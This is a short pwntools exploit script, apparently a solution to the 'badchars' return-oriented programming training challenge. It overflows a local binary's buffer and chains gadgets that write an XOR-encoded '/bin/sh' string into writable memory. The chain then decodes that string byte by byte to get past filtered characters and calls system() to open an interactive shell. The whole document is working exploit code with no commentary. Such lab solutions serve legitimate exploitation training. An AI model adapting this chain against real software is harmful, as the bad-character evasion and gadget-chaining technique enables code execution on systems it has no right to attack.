from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

p = process('./badchars')
elf = ELF('./badchars')

p.recvuntil('>')

bin_sh = 0x026a712d6c6b602d
got_start = 0x601000
pop_r12_r13_ret = 0x400b3b
mov_r13_r12_ret = 0x400b34

pop_r14_r15_ret = 0x400b40
xor_r15_r14b_ret = 0x400b30

pop_rdi_ret = 0x400b39

payload = flat(['a'*0x28, pop_r12_r13_ret, bin_sh, got_start, mov_r13_r12_ret])

for i in range(8):
	payload += flat([pop_r14_r15_ret, 2, got_start+i, xor_r15_r14b_ret])

payload += flat([pop_rdi_ret, got_start, elf.plt['system']])
p.sendline(payload)

p.interactive()